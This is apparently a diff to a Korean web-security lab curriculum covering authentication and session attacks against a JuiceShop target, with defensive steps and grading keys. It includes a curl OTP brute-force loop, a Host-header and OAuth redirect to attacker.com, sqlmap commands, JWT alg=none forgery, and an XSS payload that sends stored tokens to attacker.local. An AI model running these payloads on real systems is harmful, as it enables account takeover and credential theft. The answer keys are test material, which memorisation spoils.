+         -d "email=victim@x.com"
+    # 피해자 메일에 attacker.com 가 들어가면 → 토큰 가로채기
+    ```
+
+    ▶ 4단계: 도구 C — Burp Intruder (token enumeration)
+    1. Reset endpoint 캡처
+    2. token 부분 §...§
+    3. Payload: 시퀀셜 번호 또는 timestamp 변형
+    4. Status 200 식별 = 다른 토큰 통과
+
+    ▶ 5단계: 도구 D — sqlmap (reset endpoint SQLi)
+    ```bash
+    sqlmap -u "http://target/api/reset-password" \
+           --data='{"token":"abc","password":"new"}' --batch
+    ```
+
+    ▶ 6단계: 답변
+    토큰 패턴 + 만료 검증 응답 quote + 식별된 약점 + 방어 (cryptographic random + 단기 만료 + 1회용) 1 문장.
+  hint: '8 패턴 표 / curl 토큰 발급/예측 / Host header injection / Burp Intruder enum / sqlmap reset.'
   category: auth
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -307,8 +928,72 @@ steps:
       - 예측성 맥락 없음
   target_vm: attacker
 - order: 11
-  instruction: '{{WEB_IP}} 대상으로 2FA 우회 가능성 분석을(를) 수행하시오.'
-  hint: 2FA 우회 가능성 분석 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 2FA 우회 가능성 분석을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 2FA 우회 패턴 6종
+    | 우회 | 설명 |
+    |---|---|
+    | Response 변조 | Burp Repeater 으로 401 → 200 변조 |
+    | OTP brute force | 6자리 → 100만 시도 (rate limit 없으면) |
+    | OTP 재사용 | 한 번 사용한 OTP 재인증 가능 |
+    | 백업 코드 약함 | 8 자리 / 짧은 base32 |
+    | flow 우회 | step 1 (id/pw) 통과 후 step 2 (OTP) 건너뛰고 직접 dashboard |
+    | SIM swapping | SMS 2FA 의 phone 가로채기 |
+
+    ▶ 2단계: 도구 A — Burp Repeater 으로 Response 변조
+    ```
+    1. 정상 OTP 요청 캡처
+    2. Send to Repeater → 잘못된 OTP 입력
+    3. Response 받음 (401 또는 {"success":false})
+    4. Burp Match and Replace 으로 응답 변조 (401→200, false→true)
+    5. 브라우저가 변조된 응답 받음 → 2FA 통과
+    ```
+
+    ▶ 3단계: 도구 B — curl 으로 OTP brute force
+    ```bash
+    # 6자리 OTP rate limit 없으면 100만 시도
+    for code in $(seq -w 0 999999); do
+      RESP=$(curl -s -X POST http://target/api/2fa/verify \
+        -d "{\"otp\":\"$code\"}" -H 'Content-Type: application/json' \
+        -H "Authorization: Bearer $JWT" -w '%{http_code}')
+      if echo "$RESP" | grep -q "200"; then
+        echo "[FOUND] $code"
+        break
+      fi
+    done
+    ```
+
+    ▶ 4단계: 도구 C — flow 우회 검증 (직접 dashboard)
+    ```bash
+    # step 1 (id/pw) 만 통과 → 토큰 받음
+    TOKEN=$(curl -s -X POST http://target/api/login -d 'user=admin&pass=admin' | jq -r '.token')
+
+    # step 2 (OTP) 건너뛰고 보호 endpoint 직접 호출
+    curl -H "Authorization: Bearer $TOKEN" http://target/api/admin
+    # 200 = 2FA 적용 안 됨 = 취약
+    ```
+
+    ▶ 5단계: 도구 D — TOTP 시간 동기화 우회 (SCAPE)
+    ```bash
+    # TOTP 는 30s 윈도우. 클럭 차이 ±2 윈도우 까지 허용 시 60s 시도 가능
+    pip install pyotp
+    python3 -c "
+    import pyotp, time
+    secret = 'JBSWY3DPEHPK3PXP'  # 알려진 비밀
+    totp = pyotp.TOTP(secret)
+    print('Now:', totp.now())
+    # 시간 변조하면서 brute force
+    "
+    ```
+
+    ▶ 6단계: 답변
+    우회 시도 + 응답 200 quote + 식별된 약점 + 방어 (FIDO2 hardware key + rate limit + flow 검증) 1 문장.
+
+    **참고**: Uber 2022 사고 = 2FA fatigue (반복 알림 → 사용자 승인 클릭) + Snowflake 침해 = 2FA 미적용.
+  hint: '6 우회 패턴 표 / Burp Match and Replace / curl OTP brute / flow 우회 / pyotp TOTP 시간 변조.'
   category: auth
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -336,8 +1021,70 @@ steps:
       - MFA 맥락 없음
   target_vm: attacker
 - order: 12
-  instruction: '{{WEB_IP}} 대상으로 OAuth 취약점 분석을(를) 수행하시오.'
-  hint: OAuth 취약점 분석 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 OAuth 취약점 분석을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: OAuth 취약점 카테고리 7종
+    | 취약점 | 영향 |
+    |---|---|
+    | Open redirect (redirect_uri 미검증) | code 탈취 |
+    | state 누락 | CSRF |
+    | scope 상승 | 과다 권한 |
+    | implicit flow URL fragment | XSS 로 token 노출 |
+    | PKCE downgrade | 공개 클라이언트에서 code 탈취 |
+    | response_type 변조 | unintended flow |
+    | nonce 누락 (OIDC) | replay attack |
+
+    ▶ 2단계: 도구 A — curl 으로 OAuth flow 분석
+    ```bash
+    # 1. authorization request 분석
+    curl -i "http://target/oauth/authorize?response_type=code&client_id=app1&redirect_uri=http://attacker.com/cb&state=xyz"
+    # redirect_uri 가 화이트리스트 검증 안 하면 = open redirect
+
+    # 2. state 누락 시도
+    curl -i "http://target/oauth/authorize?response_type=code&client_id=app1&redirect_uri=http://app.com/cb"
+    # state 없이 authorize 가 통과 = CSRF 취약
+
+    # 3. scope 상승
+    curl -i "http://target/oauth/authorize?response_type=code&client_id=app1&redirect_uri=http://app.com/cb&scope=admin:write"
+    # scope 가 client 별 화이트리스트 검증 안 하면 = 과다 권한
+    ```
+
+    ▶ 3단계: 도구 B — Burp OAuth Scanner
+    1. Proxy 로 OAuth flow 캡처
+    2. 우클릭 → Engagement Tools → **Generate OAuth PoC**
+    3. 자동: redirect_uri/state/scope 변조 시도
+
+    ▶ 4단계: 도구 C — oauthtester (Python)
+    ```bash
+    pip install oauthlib requests
+    python3 -c "
+    from oauthlib.oauth2 import WebApplicationClient
+    client = WebApplicationClient('client_id')
+    # 정상 flow / 변조 flow 비교
+    "
+    ```
+
+    ▶ 5단계: 도구 D — PKCE 검증
+    ```bash
+    # PKCE 없으면 mobile/SPA 에서 code interception 가능
+    # PKCE = code_verifier (random) + code_challenge (sha256)
+    code_verifier=$(openssl rand -base64 32 | tr -d '=' | tr '+/' '-_')
+    code_challenge=$(echo -n "$code_verifier" | openssl dgst -sha256 -binary | base64 | tr -d '=' | tr '+/' '-_')
+
+    curl "http://target/oauth/authorize?response_type=code&client_id=app1&redirect_uri=http://app.com/cb&state=xyz&code_challenge=$code_challenge&code_challenge_method=S256"
+    # PKCE 강제 시 token endpoint 에 code_verifier 동봉
+    ```
+
+    ▶ 6단계: 도구 E — IdP-confused deputy attack (다중 IdP 환경)
+    Google login 으로 발급된 token 을 Facebook 의 endpoint 에 사용.
+    OIDC `iss` 클레임 검증 누락 시 가능.
+
+    ▶ 7단계: 답변
+    각 변조 응답 + open redirect / CSRF / scope 상승 식별 + 방어 (PKCE + state + iss 검증 + redirect_uri 화이트리스트) 1 문장.
+  hint: '7 카테고리 표 / curl flow 분석 / Burp OAuth Scanner / PKCE 검증 / IdP confused deputy.'
   category: auth
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -366,8 +1113,92 @@ steps:
       - OAuth 원리 맥락 없음
   target_vm: attacker
 - order: 13
-  instruction: '{{WEB_IP}} 대상으로 안전한 세션 관리 구현 방안을(를) 수행하시오.'
-  hint: 안전한 세션 관리 구현 방안 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 안전한 세션 관리 구현 방안을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: OWASP Session Management 7 권장
+    ```
+    1. 쿠키 속성: HttpOnly + Secure + SameSite=Strict + __Host- prefix
+    2. 세션 ID: cryptographic random (256+ bits)
+    3. 로그인 시 세션 재생성 (fixation 방어)
+    4. idle timeout (15~30분)
+    5. absolute timeout (8시간)
+    6. 서버측 무효화 (logout)
+    7. 동시 세션 제한 (사용자당 N개)
+    ```
+
+    ▶ 2단계: 도구 A — Express session 안전 설정
+    ```javascript
+    const session = require('express-session');
+    const RedisStore = require('connect-redis').default;
+    app.use(session({
+      store: new RedisStore({ client: redisClient }),
+      secret: process.env.SESSION_SECRET,  // 환경변수 (코드 X)
+      name: '__Host-session',  // __Host- prefix
+      cookie: {
+        httpOnly: true,
+        secure: true,
+        sameSite: 'strict',
+        maxAge: 1800000,  // 30분 idle
+      },
+      resave: false,
+      saveUninitialized: false,
+      genid: () => require('crypto').randomBytes(32).toString('base64url'),
+      rolling: true,  // 활성 시 timeout 갱신
+    }));
+
+    app.post('/login', async (req, res) => {
+      // 인증 후
+      req.session.regenerate(err => {  // 세션 재생성 (fixation 방어)
+        req.session.userId = user.id;
+        res.redirect('/dashboard');
+      });
+    });
+    ```
+
+    ▶ 3단계: 도구 B — Spring Security 설정
+    ```java
+    @Configuration
+    public class SecurityConfig {
+      @Bean
+      public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+        http.sessionManagement(session -> session
+          .sessionFixation().migrateSession()  // 재생성
+          .maximumSessions(1)                   // 동시 세션 1
+          .maxSessionsPreventsLogin(false)      // 새 로그인 시 기존 무효화
+          .sessionRegistry(sessionRegistry())
+        ).rememberMe(remember -> remember
+          .key("uniqueAndSecret")
+          .tokenValiditySeconds(86400)
+        );
+        return http.build();
+      }
+    }
+    ```
+
+    ▶ 4단계: 도구 C — Django settings.py
+    ```python
+    SESSION_COOKIE_SECURE = True
+    SESSION_COOKIE_HTTPONLY = True
+    SESSION_COOKIE_SAMESITE = 'Strict'
+    SESSION_COOKIE_AGE = 1800  # 30분
+    SESSION_EXPIRE_AT_BROWSER_CLOSE = True
+    SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'
+    ```
+
+    ▶ 5단계: 도구 D — Redis 로 세션 무효화 (logout 시)
+    ```bash
+    # Redis CLI 으로 세션 키 삭제 (즉시 무효화)
+    redis-cli DEL "session:abc123"
+    # 또는 Pattern 으로 전체 사용자 세션 삭제
+    redis-cli --scan --pattern 'session:*' | grep userId | xargs redis-cli DEL
+    ```
+
+    ▶ 6단계: 답변
+    프레임워크 1개 설정 코드 quote + 7 권장 중 4개 이상 적용 + OWASP Session Management Cheatsheet 참조.
+  hint: 'OWASP 7 권장 / Express session / Spring Security / Django settings / Redis 무효화.'
   category: defense
   points: 10
   answer: echo '=== 안전한 세션 관리 구현 방안 ===' && echo '조치 방안 정리 완료'
@@ -393,8 +1224,100 @@ steps:
       - timeout 맥락 없음
   target_vm: attacker
 - order: 14
-  instruction: '{{WEB_IP}} 대상으로 인증 강화 권고 작성을(를) 수행하시오.'
-  hint: 인증 강화 권고 작성 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 인증 강화 권고 작성을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: NIST SP 800-63B 기반 강화
+    ```
+    1. 패스워드: 8+ 자, HIBP 비교, 길이 우선 (복잡도 < 길이)
+    2. 해시: Argon2id (권장) / bcrypt (cost≥12) / PBKDF2 (10000+)
+    3. MFA: AAL2/AAL3 (FIDO2/WebAuthn 권장, SMS 비권장)
+    4. 계정 잠금: 5회 실패 시 15분 (lockout), 또는 progressive delay
+    5. CAPTCHA: 의심 IP / 다수 시도 시
+    6. 로그인 이상 탐지: 지리적 / 디바이스 변화
+    7. session: 위 step 13
+    ```
+
+    ▶ 2단계: 도구 A — Argon2id 해시 (Python)
+    ```bash
+    pip install argon2-cffi
+    python3 -c "
+    from argon2 import PasswordHasher
+    ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)
+    hash = ph.hash('mypassword')
+    print(hash)
+    print(ph.verify(hash, 'mypassword'))
+    "
+    ```
+
+    ▶ 3단계: 도구 B — HIBP API 자동 검증 (회원가입 시)
+    ```python
+    import hashlib, requests
+    def password_pwned(pwd):
+        h = hashlib.sha1(pwd.encode()).hexdigest().upper()
+        prefix, suffix = h[:5], h[5:]
+        r = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}')
+        for line in r.text.splitlines():
+            if line.startswith(suffix + ':'):
+                return int(line.split(':')[1])  # 노출 횟수
+        return 0
+
+    # 사용
+    if password_pwned('Password123') > 0:
+        raise ValueError("Password has been exposed in breaches")
+    ```
+
+    ▶ 4단계: 도구 C — WebAuthn / FIDO2 (Python flask)
+    ```bash
+    pip install webauthn  # py_webauthn 라이브러리
+    ```
+    ```python
+    from webauthn import generate_registration_options, verify_registration_response
+    options = generate_registration_options(
+      rp_id="victim.com",
+      rp_name="Example",
+      user_id=user.id.encode(),
+      user_name=user.email,
+    )
+    # 사용자가 YubiKey / TouchID 로 등록
+    ```
+
+    ▶ 5단계: 도구 D — 계정 잠금 (Redis sliding window)
+    ```python
+    import redis
+    r = redis.Redis()
+    def check_login(user_id):
+        key = f'login_fails:{user_id}'
+        fails = r.incr(key)
+        r.expire(key, 900)  # 15분
+        if fails >= 5:
+            raise Exception("Account locked. Try again in 15 minutes.")
+    ```
+
+    ▶ 6단계: 도구 E — fail2ban (server-level brute force 방어)
+    ```bash
+    sudo apt install fail2ban
+    cat > /etc/fail2ban/jail.d/web-login.conf <<'EOF'
+    [web-login]
+    enabled = true
+    filter = web-login
+    logpath = /var/log/nginx/access.log
+    maxretry = 5
+    findtime = 300
+    bantime = 3600
+    EOF
+    cat > /etc/fail2ban/filter.d/web-login.conf <<'EOF'
+    [Definition]
+    failregex = ^<HOST>.*"POST /login.*" 401
+    EOF
+    sudo systemctl restart fail2ban
+    ```
+
+    ▶ 7단계: 답변
+    7 강화 항목 1줄씩 + 도구 1개 코드 quote + NIST SP 800-63B 또는 OWASP ASVS L2/L3 준수.
+  hint: 'NIST 7 권장 / Argon2id 해시 / HIBP API / WebAuthn FIDO2 / Redis 잠금 / fail2ban server-level.'
   category: defense
   points: 12
   answer: echo '=== 인증 강화 권고 작성 ===' && echo '조치 방안 정리 완료'
@@ -420,8 +1343,75 @@ steps:
       - NIST 기준 없음
   target_vm: attacker
 - order: 15
-  instruction: 인증/세션 취약점 실습 종합 보고서를 작성하시오.
-  hint: 발견 취약점, 영향, 조치를 포함하세요.
+  instruction: |-
+    인증/세션 취약점 실습 종합 보고서를 작성하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 자동 보고서 생성
+    ```bash
+    REPORT=~/auth-week06-$(date +%F).md
+    cat > $REPORT <<EOF
+    # 인증/세션 점검 보고서
+    대상: http://10.20.30.80 / 일자: $(date -Iseconds)
+
+    ■ 1. 발견 사항
+    ▶ 1.1 패스워드 정책
+    - 최소 길이: $( ... )
+    - HIBP 비교: 적용/미적용
+    - 해시: $(curl 메서드)
+
+    ▶ 1.2 세션 토큰
+    \`\`\`
+    $(JWT 또는 cookie 분석 출력)
+    \`\`\`
+
+    ▶ 1.3 JWT 약점
+    - alg: $(추출)
+    - 서명 검증: $(jwt_tool 결과)
+
+    ▶ 1.4 MFA
+    - 활성: $(yes/no)
+    - 우회 가능: $(테스트 결과)
+
+    ■ 2. 위험도
+    | 항목 | 위험도 | CWE |
+    |---|---|---|
+    | 약한 패스워드 정책 | High | CWE-521 |
+    | 예측 가능 세션 ID | High | CWE-330 |
+    | JWT alg:none 통과 | Critical | CWE-345 + CVE-2015-9235 |
+    | MFA 미적용 | High | CWE-308 |
+    | 세션 fixation | High | CWE-384 |
+
+    ■ 3. 권고
+    1. **즉시**: JWT alg 화이트리스트 (HS256/RS256 만)
+    2. **즉시**: 패스워드 Argon2id + HIBP 검증
+    3. **단기**: WebAuthn/FIDO2 MFA 도입
+    4. **단기**: SameSite=Strict + HttpOnly + Secure 쿠키
+    5. **중기**: fail2ban + Redis 계정 잠금
+    6. **장기**: NIST SP 800-63B AAL3 준수
+
+    ■ 4. 사용 도구
+    - hydra, ffuf, wfuzz, patator (brute force)
+    - jwt_tool (JWT 우회)
+    - hashcat, john (해시 크랙)
+    - Burp Sequencer, ent (entropy)
+    - bettercap, Wireshark (MITM)
+    - Argon2 / WebAuthn (방어)
+
+    ■ 5. 윤리·법적 진술
+    - 허가 범위: 사전 서면 허가 host (10.20.30.80) only
+    - 점검 단계: 식별 + PoC. 실 사용자 자격증명 추출 미수행
+    - 로그 보존: 24개월
+    EOF
+    sha256sum $REPORT > $REPORT.sha256
+    cat $REPORT
+    echo "보고서 완료"
+    ```
+
+    ▶ 2단계: 답변
+    보고서 핵심 1~2 섹션 quote + sha256 + 사용 도구 list.
+  hint: '자동 markdown / 위험도 표 / 권고 우선순위 / sha256 / 윤리 footer.'
   category: verification
   points: 8
   answer: 'echo ''=== 인증/세션 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.30.80'' &&
@@ -450,47 +1440,39 @@ steps:
       - 조치 없음
   target_vm: attacker
 - order: 99
-  instruction: |
-    [복합 시나리오] "JWT 알고리즘 변조 + XSS 토큰 탈취 chain — 인증 자격증명 체인 공격"
+  instruction: "[복합 시나리오] \"JWT 알고리즘 변조 + XSS 토큰 탈취 chain — 인증 자격증명 체인 공격\"\n\n##\
+    \ 상황 (w05 → w06 시나리오 연속)\n\n> 선배: \"단일 취약점은 어렵지 않은데, 진짜 위험은 *체인* 이야.\n> JWT alg=none\
+    \ 변조 + XSS 가 결합되면 권한 상승 + 자격증명 탈취가 동시에 발생.\n> JuiceShop 에서 JWT 변조 PoC + XSS payload\
+    \ 시연 + 방어 매트릭스 정리해.\"\n\n학습 목표 (lecture #1·#2 XSS + #3 CSRF) + (lab #7·#8·#9 JWT\
+    \ + #6 세션 하이재킹) 통합.\n\n## 임무 (3 단계, 약 35분)\n\nNon-AI 트랙: ssh ccc@10.20.30.201\
+    \ (attacker VM) 직접 실행.\n\n### Phase A — JWT alg=none 변조\n1) `curl -s -X POST -H\
+    \ \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op\",\"password\"\
+    :\"admin123\"}'\n   http://10.20.30.80/rest/user/login` 응답에서 JWT 획득.\n2) python3\
+    \ 으로 alg=none 변조:\n   `python3 -c \"import base64; h=base64.urlsafe_b64encode(b'{\\\
+    \"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}').rstrip(b'=').decode();\n   \
+    \ print(h+'.<원본 payload>.')\"`\n3) `curl -i -H \"Authorization: Bearer <변조>\"\
+    \ http://10.20.30.80/rest/user/whoami` (보통 거부 — 정상).\n\n### Phase B — XSS payload\
+    \ + 토큰 탈취 시뮬레이션\nPayload: `<script>fetch('http://attacker.local/steal?t='+localStorage.getItem('token'))</script>`\n\
+    `nc -lk 9999 &` + 다른 터미널 `curl \"http://localhost:9999/steal?t=FAKEJWT\"` 자체 시뮬.\n\
+    \n### Phase C — 자격증명 방어 매트릭스\n| 위협 | 공격면 | 방어 1 | 방어 2 | 잔존 위험 |\n| JWT alg 변조\
+    \ | server alg whitelist | strict alg check | RS256 | key leak |\n| localStorage\
+    \ 탈취 | XSS | HttpOnly Cookie | CSP | XSS+CSRF chain |\n| Cookie 탈취 | XSS+Cookie\
+    \ | HttpOnly+Secure | SameSite=Strict | mitm |\n| Refresh token 탈취 | 영구 자격증명 |\
+    \ rotation+short TTL | device binding | refresh leak |\n표 끝 \"JuiceShop 권고: alg\
+    \ whitelist + HttpOnly Cookie + SameSite=Strict + refresh rotation\" 한 줄.\n\n\
+    종료: echo \"=== Phase A JWT ===\" / \"=== Phase B XSS ===\" / \"=== Phase C 매트릭스\
+    \ ===\".\n\n\n[도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구:\
+    \ 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout\
+    \ 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과."
+  hint: 'Phase A: alg=none 은 RFC 7519 unsecured JWS. JuiceShop 차단됨 — 시도 자체가 학습.
 
-    ## 상황 (w05 → w06 시나리오 연속)
-
-    > 선배: "단일 취약점은 어렵지 않은데, 진짜 위험은 *체인* 이야.
-    > JWT alg=none 변조 + XSS 가 결합되면 권한 상승 + 자격증명 탈취가 동시에 발생.
-    > JuiceShop 에서 JWT 변조 PoC + XSS payload 시연 + 방어 매트릭스 정리해."
-
-    학습 목표 (lecture #1·#2 XSS + #3 CSRF) + (lab #7·#8·#9 JWT + #6 세션 하이재킹) 통합.
-
-    ## 임무 (3 단계, 약 35분)
-
-    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
-
-    ### Phase A — JWT alg=none 변조
-    1) `curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
-       http://10.20.30.80/rest/user/login` 응답에서 JWT 획득.
-    2) python3 으로 alg=none 변조:
-       `python3 -c "import base64; h=base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').rstrip(b'=').decode();
-        print(h+'.<원본 payload>.')"`
-    3) `curl -i -H "Authorization: Bearer <변조>" http://10.20.30.80/rest/user/whoami` (보통 거부 — 정상).
-
-    ### Phase B — XSS payload + 토큰 탈취 시뮬레이션
-    Payload: `<script>fetch('http://attacker.local/steal?t='+localStorage.getItem('token'))</script>`
-    `nc -lk 9999 &` + 다른 터미널 `curl "http://localhost:9999/steal?t=FAKEJWT"` 자체 시뮬.
-
-    ### Phase C — 자격증명 방어 매트릭스
-    | 위협 | 공격면 | 방어 1 | 방어 2 | 잔존 위험 |
-    | JWT alg 변조 | server alg whitelist | strict alg check | RS256 | key leak |
-    | localStorage 탈취 | XSS | HttpOnly Cookie | CSP | XSS+CSRF chain |
-    | Cookie 탈취 | XSS+Cookie | HttpOnly+Secure | SameSite=Strict | mitm |
-    | Refresh token 탈취 | 영구 자격증명 | rotation+short TTL | device binding | refresh leak |
-    표 끝 "JuiceShop 권고: alg whitelist + HttpOnly Cookie + SameSite=Strict + refresh rotation" 한 줄.
-
-    종료: echo "=== Phase A JWT ===" / "=== Phase B XSS ===" / "=== Phase C 매트릭스 ===".
-  hint: |
-    Phase A: alg=none 은 RFC 7519 unsecured JWS. JuiceShop 차단됨 — 시도 자체가 학습.
     Phase B: nc -lk 로컬 + curl 자체 callback.
+
     Phase C: 4행 매트릭스 + 권고 한 줄.
+
     포인트: chain 관점 — JWT+XSS 결합 시 영향 폭증.
+
+    '
   category: integration_scenario
   points: 50
   verify:
@@ -498,9 +1480,11 @@ steps:
     expect: 매트릭스
     field: stdout
     semantic:
-      intent: |
-        JWT alg=none 변조 + XSS 토큰 탈취 chain 점검 + 자격증명 방어 매트릭스.
+      intent: 'JWT alg=none 변조 + XSS 토큰 탈취 chain 점검 + 자격증명 방어 매트릭스.
+
         lecture #1·#2·#3 + lab #7·#8·#9·#6 동시 행동 증명.
+
+        '
       success_criteria:
       - Phase A — JWT 획득 + alg=none 변조 + whoami 시도
       - Phase B — XSS payload + nc/curl 시뮬
@@ -517,6 +1501,8 @@ steps:
       - chain 관점 누락
   target_vm: attacker
   risk_level: low
-  answer_detail: |
-    학생이 ssh attacker 직접. JWT alg=none 차단되는 게 정상. XSS 는 nc 자체 시뮬.
+  answer_detail: '학생이 ssh attacker 직접. JWT alg=none 차단되는 게 정상. XSS 는 nc 자체 시뮬.
+
     핵심은 chain — 두 취약점 결합 영향.
+
+    '
